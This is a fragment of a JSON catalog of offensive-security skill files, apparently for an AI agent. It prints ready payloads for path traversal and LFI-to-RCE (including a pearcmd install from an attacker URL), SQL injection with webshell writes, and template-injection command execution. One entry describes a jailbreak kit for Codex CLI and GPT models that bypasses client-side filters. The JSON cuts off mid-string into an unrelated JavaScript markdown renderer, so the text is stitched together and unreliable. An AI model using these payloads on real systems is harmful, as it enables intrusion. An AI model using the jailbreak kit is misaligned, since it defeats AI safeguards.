MAC-disabled).\n4. **Deliver** in the sink; start with an OOB command (`curl`/`nslookup` to your host) as safe proof.\n\n## Gotchas\n- The chain must match a library actually present (Commons-Collections version, Monolog, etc.) — enumerate dependencies.\n- Java: prefer a DNS/OOB gadget to confirm before an RCE payload.\n- .NET ViewState needs the machineKey unless MAC validation is off — check for leaked web.config.\n\n## Verify success\nAn OOB callback or command output proving code executed during deserialization.\n\n## References\nysoserial / phpggc / ysoserial.net; PortSwigger deserialization labs; OWASP.\n"}, {"name": "web-lfi-path-traversal", "cat": "static", "catLabel": "⚙️ 静态分析 · 反编译", "star": false, "oneliner": "Local File Inclusion / path traversal → read files, sometimes RCE. Load ", "desc": "Local File Inclusion / path traversal → read files, sometimes RCE. Load when a param names a file/path/template/page: ?file=, ?page=, ?template=, ?download=, ?lang=, or path segments. Signals: filenames in params, \"include\", download endpoints, `../` filtered, `.php?page=`.", "bytes": 2774, "human": "2.7 KB", "path": "/var/minis/skills/web-lfi-path-traversal/SKILL.md", "subdirs": [], "files": [], "body": "# LFI / path traversal\n\n## When it applies\nA parameter or path segment controls which file the server reads/includes. Path traversal reads\narbitrary files; LFI (include) can execute them → RCE.\n\n## Why it works\nThe app builds a filesystem path from user input without normalizing/constraining it, so `../`\nsequences escape the intended directory. If the value is `include`d (PHP), included content is executed.\n\n## Method\n1. **Read a canary**: `?file=/etc/passwd`, then traversal `?file=../../../../etc/passwd`; on\n   Windows `..\\..\\..\\windows\\win.ini`.\n2. **Defeat filters**: URL-encode `..%2f`, double `..%252f`, `....//` (strip-once), overlong\n   `%c0%af`, null `%00` (old PHP), absolute paths, nested `....`.\n3. **PHP wrappers → source/RCE**: `php://filter/convert.base64-encode/resource=index.php`\n   (read source), `data://`/`expect://`, and **log poisoning** (write PHP into a log via\n   User-Agent, then include the log) or session/`/proc/self/environ` inclusion for RCE.\n4. **PEAR `pearcmd.php` LFI→RCE** (very common on PHP hosts with `register_argc_argv=On` and PEAR\n   installed): include `/usr/local/lib/php/pearcmd.php` and pass args via the query string, e.g.\n   `?file=/usr/local/lib/php/pearcmd.php&+install+--installroot=/var/www/html+<attacker.tgz-URL>`\n   to write attacker-controlled content into the webroot, then request it. The trick is that\n   `register_argc_argv` lets `pearcmd` read `argv` from the URL query — no upload needed.\n5. **Enumerate targets**: config files, keys, app source, history files, and an exposed\n   `/.git/` (grab `.git/HEAD`/`config` → dump the repo → `git log -p` for deleted secrets);\n   `ffuf` a LFI wordlist.\n\n…（完整内容见 SKILL.md）"}, {"name": "web-sqli", "cat": "static", "catLabel": "⚙️ 静态分析 · 反编译", "star": false, "oneliner": "Detect and exploit SQL injection (error-based, UNION, boolean/time blind", "desc": "Detect and exploit SQL injection (error-based, UNION, boolean/time blind, stacked). Load when a param feeds a query, you see DB errors, numeric/string params change result sets, login forms, search, sort/order-by, or ORM raw queries. Signals: \"id=\", 500 on a quote, \"You have an error in your SQL syntax\", MySQL/Postgres/MSSQL/Oracle banners.", "bytes": 3317, "human": "3.2 KB", "path": "/var/minis/skills/web-sqli/SKILL.md", "subdirs": [], "files": ["cheatsheet.md"], "body": "# SQL Injection (SQLi)\n\n## When it applies\nUser input is concatenated into a SQL query. Test every param, header (`X-Forwarded-For`,\n`User-Agent`, `Referer` sometimes logged into DB), cookie, and JSON field — not just `?id=`.\n\n## Why it works\nThe query string mixes code and data. A stray quote/operator lets you close the intended\nliteral and append your own SQL, which the engine parses as instructions. Blind variants\nleak data one bit at a time via truthy/falsy responses or timing.\n\n## Method\n> **Exact per-DB payloads, blind/error/time variants, and WAF bypasses:** see\n> [`cheatsheet.md`](cheatsheet.md) next to this file. Work the *whole* variation set for a\n> parameter before concluding it isn't injectable — one failed quote is not a clean param.\n\n1. **Detect** — send `'`, `\"`, `)`, then a self-true vs self-false pair:\n   `id=1 AND 1=1` vs `id=1 AND 1=2` (numeric); `x' AND '1'='1` vs `x' AND '1'='2` (string).\n   Different responses = injectable. Error text = fast win; identical = try blind/time.\n2. **Fingerprint the DB** (comment style, string concat, version fn) then pick a technique:\n   - **UNION**: find column count (`ORDER BY n` until error), find a string-typed column, then\n     `UNION SELECT NULL,version(),NULL-- -` and pull `information_schema`.\n   - **Boolean-blind**: `AND SUBSTRING((SELECT ...),1,1)='a'` — automate the oracle.\n   - **Time-blind**: `AND SLEEP(5)` / `pg_sleep(5)` / `WAITFOR DELAY '0:0:5'` when no visible diff.\n3. **Escalate beyond data** where the DB privileges allow:\n   - **File read** (MySQL `FILE` priv): `UNION SELECT LOAD_FILE('/etc/passwd')` — read app source,\n     keys, config to find the next bug.\n   - **File write → webshell**: `... INTO OUTFILE '/var/www/html/s.php'` (needs `FILE`, a writable\n     path, and `secure_file_priv` unset). MS\n\n…（完整内容见 SKILL.md）"}, {"name": "web-ssti", "cat": "static", "catLabel": "⚙️ 静态分析 · 反编译", "star": false, "oneliner": "Server-Side Template Injection → RCE. Load when user input is rendered b", "desc": "Server-Side Template Injection → RCE. Load when user input is rendered by a template engine: profile names in emails, custom reports, \"hello {{name}}\", error pages echoing math, Jinja2/Twig/Freemarker/Velocity/ERB/Handlebars. Signals: {{7*7}} returns 49, ${...} or #{...} evaluated, framework stack traces mentioning a templating engine.", "bytes": 2540, "human": "2.5 KB", "path": "/var/minis/skills/web-ssti/SKILL.md", "subdirs": [], "files": ["cheatsheet.md"], "body": "# Server-Side Template Injection (SSTI)\n\n## When it applies\nInput flows into a server-side template that is *evaluated*, not just interpolated as text.\nCommon in email/notification templates, custom dashboards, and any \"use variables in your\nmessage\" feature.\n\n## Why it works\nTemplate engines execute expressions. If attacker input becomes part of the template source\n(rather than a bound variable), the engine evaluates it — and most engines expose object\nintrospection that reaches OS command execution.\n\n## Method\n> **Payloads & full variation set:** [`cheatsheet.md`](cheatsheet.md) next to this file — work the set, not the first line.\n1. **Detect** with a polyglot and engine-specific probes:\n   `${7*7}` `{{7*7}}` `<%= 7*7 %>` `#{7*7}` `{7*7}` — a rendered `49` (not literal text) confirms.\n2. **Identify the engine** by which syntax evaluated and by error messages, then branch:\n   - **Jinja2 (Python)**: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`\n   - **Twig (PHP)**: `{{ ['id']|filter('system') }}` or `_self.env.registerUndefinedFilterCallback`.\n   - **Freemarker (Java)**: `<#assign x=\"freemarker.template.utility.Execute\"?new()>${x(\"id\")}`.\n   - **ERB (Ruby)**: `<%= \\`id\\` %>`.\n3. **Automate/confirm** with `tplmap -u <url>` once you know it's injectable, but understand the\n   payload — WAFs and sandboxes need manual gadget-chaining.\n\n## Gotchas\n- `{{7*7}}` → `49` is SSTI; `{{7*'7'}}` behaviour distinguishes Jinja (`7777777`) from Twig (`49`).\n- Sandboxed engines (Twig sandbox, Jinja SandboxedEnvironment) block direct globals — hunt for a bypass gadget.\n- XSS ≠ SSTI: `<svg>` rendering is client-side; only server-side *evaluation* of expressions is SSTI.\n\n…（完整内容见 SKILL.md）"}, {"name": "web-testing-checklist", "cat": "static", "catLabel": "⚙️ 静态分析 · 反编译", "star": false, "oneliner": "A fast, ordered checklist for testing a web application end to end — so ", "desc": "A fast, ordered checklist for testing a web application end to end — so nothing gets skipped. Load when starting on a web target, \"checklist\", \"what should I test\", methodology triage, or to confirm coverage before reporting. Signals: a new web app in scope, \"am I missing anything\".", "bytes": 2196, "human": "2.1 KB", "path": "/var/minis/skills/web-testing-checklist/SKILL.md", "subdirs": [], "files": [], "body": "# Web application testing checklist\n\nWork top to bottom; each item links to the skill that goes deep. Confirm scope first\n(`tradecraft-scope-roe`).\n\n## Recon & mapping\n- [ ] Subdomains + live hosts (`recon-subdomain-enum`), DNS (`recon-dns-analysis`)\n- [ ] Content/endpoint + param discovery (`recon-content-discovery`), JS mining (`recon-js-analysis`)\n- [ ] Fingerprint stack/versions; note WAF/CDN (`web-arsenal`)\n\n## Authentication & session\n- [ ] Login/registration flaws, username enumeration, rate limiting\n- [ ] Password reset & email change (`web-account-takeover`), OTP/2FA bypass\n- [ ] Session handling & JWT (`web-auth-jwt`); OAuth/SSO (`web-oauth`)\n\n## Authorization\n- [ ] IDOR / object-level (`web-idor`); function-level / forced browsing\n- [ ] Multi-tenant boundary crossing\n\n## Input handling (injection & rendering)\n- [ ] XSS reflected/stored/DOM (`web-xss`, `payloads-xss-polyglots`)\n- [ ] SQLi (`web-sqli`), NoSQLi; SSTI (`web-ssti`); command injection\n- [ ] SSRF (`web-ssrf`); XXE (`web-xxe`); LFI/traversal (`web-lfi-path-traversal`)\n- [ ] Deserialization (`web-deserialization`); prototype pollution (`web-prototype-pollution`)\n\n## App logic & client\n- [ ] Business logic (`web-business-logic`); race conditions (`web-race-conditions`)\n- [ ] File upload (`web-file-upload`); CSRF (`web-csrf`); CORS (`web-cors`); open redirect (`web-open-redirect`)\n- [ ] Host-header/cache (`web-cache-poisoning`), request smuggling (`web-request-smuggling`)\n\n## Before reporting\n- [ ] Impact proven & reproducible; evidence captured; severity set (`reporting-bug-bounty-writeup`)\n- [ ] In scope, within RoE; no real data hoarded\n\n## Notes\nA checklist is a coverage aid, not a substitute for judgment — follow the leads that look weird.\n"}, {"name": "xiaoliu-pojia", "cat": "ctf", "catLabel": "🚩 CTF 竞赛", "star": false, "oneliner": "小liu破甲 v2 —— 针对 gpt-5.6-sol / gpt-5.5 的 Codex CLI 破甲提示词与一键部署工具（deploy.py", "desc": "小liu破甲 v2 —— 针对 gpt-5.6-sol / gpt-5.5 的 Codex CLI 破甲提示词与一键部署工具（deploy.py / ask.py / check.py）。融合 MDX-Tom v42、codex-keysmith、CTF SANDBOX 三大方法论。当需要 Codex CLI 破甲部署、撤销、状态检查或直连 API 调用时使用。", "bytes": 1080, "human": "1.1 KB", "path": "/var/minis/skills/xiaoliu-pojia/SKILL.md", "subdirs": [], "files": [".gitignore", "README.md", "ask.py", "check.py", "ctf-sandbox.md", "deploy.py"], "body": "# 小liu破甲（Codex CLI 破甲提示词 + 一键部署）\n\n> 来源：https://github.com/xiaoliu07-sudo/xiaoliu-pojia （完整克隆在本目录，depth=1；更新：`git -C /var/minis/skills/xiaoliu-pojia pull`）\n\n## 文件地图\n- `deploy.py` — 一键部署（自动发现 `~/.codex`；支持 `--status` / `--undo` / `--dir` 指定目录）\n- `ask.py` — 直连 API 调用（绕过 Codex 客户端过滤器）\n- `check.py` — 状态检查\n- `ctf-sandbox.md` — CTF SANDBOX 方法论（融合来源之一）\n- `README.md` — 13 部分融合版设计、特点与完整用法\n\n## 使用\n在目标机器上按 `README.md`：`python deploy.py` 部署；`python deploy.py --undo` 撤销；每次操作前自动备份 `config.toml`。\n"}, {"name": "yara-rule-authoring", "cat": "malware", "catLabel": "🦠 恶意代码 · 检测规则", "star": false, "oneliner": "YARA-X 高质量检测规则编写（含测试方法）", "desc": "Guides authoring of high-quality YARA-X detection rules for malware identification. Use when writing, reviewing, or optimizing YARA rules. Covers naming conventions, string selection, performance optimization, migration from legacy YARA, and false positive reduction. Triggers on: YARA, YARA-X, malware detection, threat hunting, IOC, signature, crx module, dex module.", "bytes": 23812, "human": "23.3 KB", "path": "/var/minis/skills/yara-rule-authoring/SKILL.md", "subdirs": ["agents", "assets", "examples", "references", "scripts", "workflows"], "files": ["SOURCE.md"], "body": "# YARA-X Rule Authoring\n\nWrite detection rules that catch malware without drowning in false positives.\n\n**This skill targets YARA-X**, the Rust-based successor to legacy YARA — 5-10x faster regex, better errors, built-in formatter, stricter validation, new modules (crx, dex), 99% rule compatibility. It powers VirusTotal's production systems. Install with `brew install yara-x` or `cargo install yara-x`; the CLI is `yr`. See [Migrating from Legacy YARA](#migrating-from-legacy-yara) for existing rules.\n\n## Core Principles\n\n1. **Strings must generate good atoms** — YARA extracts 4-byte subsequences for fast matching. Strings with repeated bytes, common sequences, or under 4 bytes force slow bytecode verification on too many files.\n\n2. **Target specific families, not categories** — \"Detects ransomware\" catches everything and nothing. \"Detects LockBit 3.0 configuration extraction routine\" catches what you want.\n\n3. **Test against goodware before deployment** — A rule that fires on Windows system files is useless. Validate against VirusTotal's goodware corpus or your own clean file set.\n\n4. **Short-circuit with cheap checks first** — `filesize` (instant), then magic bytes (nearly instant), then strings (cheap), then modules (expensive).\n\n5. **Metadata is documentation** — Future you (and your team) need to know what this catches, why, and where the sample came from.\n\n## When to Use\n\n- Writing new YARA-X rules for malware detection\n- Reviewing existing rules for quality or performance issues\n- Optimizing slow-running rulesets\n- Converting IOCs or threat intel into detection signatures\n- Debugging false positive issues\n- Preparing rules for production deployment\n- Migrating legacy YARA rules to YARA-X\n- Analyzing Chrome extensions (crx module) or Android apps (dex module)\n\n…（完整内容见 SKILL.md）"}, {"name": "yara-scan", "cat": "malware", "catLabel": "🦠 恶意代码 · 检测规则", "star": false, "oneliner": "YARA 扫描文件 / 目录（classic + YARA-X）", "desc": "Scan a file or directory with YARA rules (classic yara or the newer yara-x). Ships a small high-signal starter rule pack; point --rules at a real corpus (YARA-Rules, signature-base, your own) for serious coverage. Read-only — matches patterns, never runs the target. Prereq-gated on the yara CLI with honest degradation.", "bytes": 1836, "human": "1.8 KB", "path": "/var/minis/skills/yara-scan/SKILL.md", "subdirs": ["assets", "scripts"], "files": ["SOURCE.md"], "body": "# YARA Scanner\n\nScan a file or directory with [YARA](https://virustotal.github.io/yara/) rules — the\nstandard way to match known malware patterns/families.\n\n## When to use\n\nAny triage where you want signature coverage: run it over a package, an extracted\narchive, a dropped sample, or a whole tree. Complements the behavioural covert-scan\nskills (which look at *tactics*) with *signature* matching.\n\n## What it does\n\nRuns `yara` (or `yara-x`/`yr`) with your rules over the target and reports each match\nas `{rule, target}`. Read-only — YARA matches patterns; it never runs the target.\n\nShips a small **starter rule pack** (`assets/starter.yar`): embedded/base64-encoded\nPE, UPX packing, PHP webshell eval, Windows exec/download cradles, and `curl|sh`\ndroppers. **This is a starting point, not a corpus** — for real coverage point\n`--rules` at [YARA-Rules](https://github.com/Yara-Rules/rules),\n[Neo23x0/signature-base](https://github.com/Neo23x0/signature-base), or your own set.\n\n## Usage\n\n```bash\nrekit run yara-scan ./package                       # starter rules over a tree\nrekit run yara-scan ./sample.bin --rules ~/rules    # your own corpus\nrekit run yara-scan ./x --format json\n```\n\n## Prerequisites\n\n- **python3** (runner) and the **`yara`** CLI (or `yara-x`) on PATH — a native tool,\n  not bundled. Until it's installed, `doctor` marks the skill not-ready and `run`\n  reports the honest gap with an install hint. (The starter rules ship with the skill.)\n"}, {"name": "zhaoxuya-field-journal", "cat": "static", "catLabel": "⚙️ 静态分析 · 反编译", "star": false, "oneliner": "逆向/安全实战日记合集（45 篇真实案例，含 Android/Go/DSL-VM/Electron/固件/APK 等方向的一手复盘笔记）。当遇到", "desc": "逆向/安全实战日记合集（45 篇真实案例，含 Android/Go/DSL-VM/Electron/固件/APK 等方向的一手复盘笔记）。当遇到类似目标或想参考真实作战思路时加载对应的日记。Use when looking for real-world case studies and field notes on reverse engineering and pentesting engagements.", "bytes": 3990, "human": "3.9 KB", "path": "/var/minis/skills/zhaoxuya-field-journal/SKILL.md", "subdirs": ["journal"], "files": [], "body": "# zhaoxuya 实战日记（Field Journal）\n\n真实项目的一手复盘记录，每篇包含：目标背景 → 分析过程 → 关键手法 → 结论。\n参考价值：遇到相似目标时先搜这里是否已有案例。\n\n## 用法\n\n1. 按关键词在 `journal/` 目录里 grep（如 `grep -ri \"flutter\" journal/`）\n2. 或按标题浏览下表，直接读对应文件\n\n## 全部日记（45 篇）\n\n- `2026-05-15-cellular-pro-mumu-ksad-fragment-fix.md` — 2026-05-15 · cellular pro mumu ksad fragment fix\n- `2026-05-15_lumine-go-reverse.md` — 2026-05-15 · lumine go reverse\n- `2026-05-16_pentest-personalblog-fun-mass-assignment.md` — 2026-05-16 · pentest personalblog fun mass assignment\n- `2026-05-17_pentest-vue-spa-actuator-leak.md` — 2026-05-17 · pentest vue spa actuator leak\n- `2026-05-25_pentest-cf-access-sibling-subdomain-cookie-poisoning.md` — 2026-05-25 · pentest cf access sibling subdomain cookie poisoning\n- `2026-05-26_pentest-newapi-rate-limit-bypass.md` — 2026-05-26 · pentest newapi rate limit bypass\n- `2026-06-29_burp-mcp-full-test-and-fix.md` — 2026-06-29 · burp mcp full test and fix\n- `2026-07-05_dsl-vm-captcha-reverse.md` — 2026-07-05 · dsl vm captcha reverse\n- `2026-07-14_android-arm64-self-extract-source-recovery.md` — 2026-07-14 · android arm64 self extract source recovery\n- `2026-07-18_gin-juice-cli /* ---------- markdown lite ---------- */
function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
function inl(s){
  s = esc(s);
  s = s.replace(/`([^`\n]+)`/g,'<code>$1</code>');
  s = s.replace(/\*\*([^*\n]+)\*\*/g,'<b>$1</b>');
  s = s.replace(/\[([^\]]+)\]\(([^)\s]+)\)/g,'<span class="a" title="'+'$2'+'">$1</span>');
  return s;
}
function renderTable(rows){
  const cells = r => r.trim().replace(/^\||\|$/g,'').split('|').map(c=>c.trim());
  let head=null, body=[];
  for(const r of rows){
    if(/^\|[\s:|\-]+\|$/.test(r.replace(/\s/g,'')) || /^[\s:|\-]+$/.test(r)) continue;
    const c = cells(r);
    if(!head) head=c; else body.push(c);
  }
  let h='<table>';
  if(head) h+='<thead><tr>'+head.map(c=>'<th>'+inl(c)+'</th>').join('')+'</tr></thead>';
  h+='<tbody>'+body.map(r=>'<tr>'+r.map(c=>'<td>'+inl(c)+'</td>').join('')+'</tr>').join('')+'</tbody></table>';
  return h;
}
function md(src){
  src = src.replace(/^---\r?\n[\s\S]*?\r?\n---\r?\n/,'');
  const L = src.split(/\r?\n/);
  let out=[], list=null, table=null;
  const closeList = ()=>{ if(list){ out.push('</'+list+'>'); list=null; } };
  const closeTable = ()=>{ if(table){ out.push(renderTable(table)); table=null; } };
  for(let i=0;i<L.length;i++){
    let ln = L[i];
    if(/^\s*```/.test(ln)){
      closeList(); closeTable();
      let buf=[]; i++;
      while(i<L.length && !/^\s*```/.test(L[i])){ buf.push(L[i]); i++; }
      out.push('<pre><code>'+esc(buf.join('\n'))+'</code></pre>');
      continue;
    }
    if(/^\s*\|.*\|\s*$/.test(ln)){ closeList(); (table=table||[]).push(ln); continue; }
    closeTable();
    if(/^\s*$/.test(ln)){ closeList(); continue; }
    if(/^\s*(-{3,}|\*{3,}|_{3,})\s*$/.test(ln)){ closeList(); out.push('<hr>'); continue; }
    let m = ln.match(/^(#{1,6})\s+(.*)$/);
    if(m){ closeList(); const lv=Math.min(m[1].length+1,6); out.push('<h'+lv+'>'+inl(m[2])+'</h'+lv+'>'); continue; }
    if(/^\s*[-*+]\s+/.test(ln)){
      if(list!=='ul'){ closeList(); out.push('<ul>'); list='ul'; }
      out.push('<li>'+inl(ln.replace(/^\s*[-*+]\s+/,''))+'</li>'); continue;
    }
    if(/^\s*\d+[.)]\s+/.test(ln)){
      if(list!=='ol'){ closeList(); out.push('<ol>'); list='ol'; }
      out.push('<li>'+inl(ln.replace(/^\s*\d+[.)]\s+/,''))+'</li>'); continue;
    }
    if(/^\s*>\s?/.test(ln)){ closeList(); out.push('<blockquote>'+inl(ln.replace(/^\s*>\s?/,''))+'</blockquote>'); continue; }
    closeList();
    out.push('<p>'+inl(ln)+'</p>');
  }
  closeList(); closeTable();
  return out.join('\n');
}
